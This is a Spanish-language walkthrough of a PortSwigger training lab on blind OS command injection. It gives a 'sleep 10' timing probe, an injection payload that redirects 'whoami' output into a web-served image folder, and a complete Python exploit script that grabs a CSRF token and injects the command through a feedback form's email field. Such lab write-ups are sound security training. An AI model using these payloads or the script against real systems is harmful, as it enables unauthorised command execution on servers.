---
title: "03 Blind OS command injection with output redirection"
collection: publications
category: portswigger
permalink: publications/Command Injection/03_Blind OS command injection with output redirection
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección de comandos de SO ciego en la función de retroalimentación. La aplicación ejecuta un comando shell que contiene los detalles proporcionados por el usuario. La salida del comando no se devuelve en la respuesta. Sin embargo, puede utilizar la redirección de salida para capturar la salida del comando. Hay una carpeta con permisos de escritura en /var/www/images/. La aplicación sirve las imágenes para el catálogo de productos desde esta ubicación. Puede redirigir la salida del comando inyectado a un archivo de esta carpeta y, a continuación, utilizar la URL de carga de imágenes para recuperar el contenido del archivo.'
date: 2024-12-08
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'Blind OS command injection with output redirection'
---

![logo]({{site.url}}/images/Command Injection/command-lab-3/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/Command Injection/command-lab-3/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, ejecutamos el comando whoami y recuperamos la salida.

## Analisis

Probamos la entrade del formulario y la capturamos con el Burpsuite

![Conf1]({{site.url}}/images/Command Injection/command-lab-3/conf1.png)

Probamos con cada campo a ver cual es vulnerable, probamos el comando `& sleep 10 #` si se demora 10 segundos es vulnerable.

![Conf2]({{site.url}}/images/Command Injection/command-lab-3/conf2.png)

Como por este medio no vamos a obtener una respuesta, nos toca redireccionar la salida de la respuesta en un archivo. Como vemos tenemos una carpeta donde se almacenan las imagenes `/image?filename=5.jpg` 

![Conf3]({{site.url}}/images/Command Injection/command-lab-3/conf3.png)

Vamos a redireccionar la salida de la siguiente forma a la carpeta `/var/www/images`, y no olvidar hacer el `url encode`

```python
& whoami > /var/www/images/salida.txt #
```

![Conf4]({{site.url}}/images/Command Injection/command-lab-3/conf4.png)

Vemos la salida del texto en:

![Conf5]({{site.url}}/images/Command Injection/command-lab-3/conf5.png)

## Aprobado

![Aprobado]({{site.url}}/images/Command Injection/command-lab-3/aprobado.png)

# Codigo Python

```python
import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s,url):
    feedback_path = '/feedback'
    r = s.get(url + feedback_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def exploit_command_injection(s, url):
    submit_feedback_path = '/feedback/submit'
    command_injection = 'test@test.ca & whoami > /var/www/images/output2.txt #'
    csrf_token = get_csrf_token(s, url)
    data = {'csrf': csrf_token, 'name': 'test', 'email': command_injection, 'subject': 'test', 'message': 'test'}
    res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
    print("(+) Verifying if command injection exploit worked...")

    # verify command injection
    file_path = '/image?filename=output2.txt'
    res2 = s.get(url + file_path, verify=False, proxies=proxies)
    if (res2.status_code == 200):
        print("(+) Command injection successful!")
        print("(+) The following is the content of the command: " + res2.text)
    else:
        print("(-) Command injection was not successful.")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("(+) Exploiting blind command injection in email field...")

    s = requests.Session()
    exploit_command_injection(s, url)

if __name__ == "__main__":
    main()
```